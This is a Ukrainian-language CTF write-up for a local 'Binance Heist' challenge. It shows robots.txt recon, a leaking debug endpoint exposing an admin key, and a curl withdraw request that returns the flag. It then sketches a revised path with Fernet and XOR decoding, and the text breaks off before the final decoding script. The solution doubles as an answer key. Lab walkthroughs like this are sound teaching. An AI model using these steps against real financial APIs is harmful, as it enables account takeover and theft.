# Взлом Binance API (Writeup)

Це рішення для CTF "Operation Binance Heist".

1. **Розвідка (Recon):**
   Гравець відкриває `http://localhost:5000` (фрейм, що відображається після натискання СТАРТ).
   За стандартною практикою перевіряємо `robots.txt`:
   ```
   GET http://localhost:5000/robots.txt
   ```
   Знаходимо прихований шлях: `Disallow: /api/v3/internal/debug`

2. **Витік інформації (Information Disclosure):**
   Переходимо за знайденим маршрутом:
   ```
   GET http://localhost:5000/api/v3/internal/debug
   ```
   Отримуємо JSON з ключами:
   ```json
   {
       "admin_auth_key": "BNC-ADM-88912-SECRET",
       "target_cold_wallet": "CW-BTC-994100",
       "hint": "POST to /api/v3/wallet/withdraw with X-API-Key header and wallet_id in JSON body"
   }
   ```

3. **Експлуатація (API Auth Bypass):**
   Використовуємо знайдений ключ та ID гаманця для крадіжки через Postman, cURL або Python:
   ```bash
   curl -X POST http://localhost:5000/api/v3/wallet/withdraw \
        -H "X-API-Key: BNC-ADM-88912-SECRET" \
        -H "Content-Type: application/json" \
        -d '{"wallet_id": "CW-BTC-994100"}'
   ```

4. **Результат:**
   Сервер повертає прапор:
   `CTF{b1n4nc3_h4ck3d_c0ld_w4ll3t_st0l3n}`


Як тепер виглядає проходження (Attack Path):

    Recon: Гравець заходить на http://localhost:5000/. Дивиться вихідний код (Ctrl+U) і знаходить ключ Fernet у коментарі <!-- DEBUG_KEY: ... -->.

    Robots: Гравець йде в /robots.txt і знаходить /api/v3/internal/debug.

    Перша декриптовка (Fernet): Гравець бачить зашифрований admin_key. Він пише Python-скрипт із використанням cryptography.fernet, щоб розшифрувати його знайденим ключем і отримує BNC-ADM-88912-SECRET.

    Експлуатація (Withdraw): Гравець робить POST-запит з правильним заголовком та JSON-тілом, як ми планували раніше.

    Друга декриптовка (XOR): Сервер каже "Успіх", але віддає зашифрований прапор KDs2EgleBVse... і підказку, що це XOR із ключем kopiko.

    Отримання прапора: Гравець пише фінальний скрипт для декодування прапора: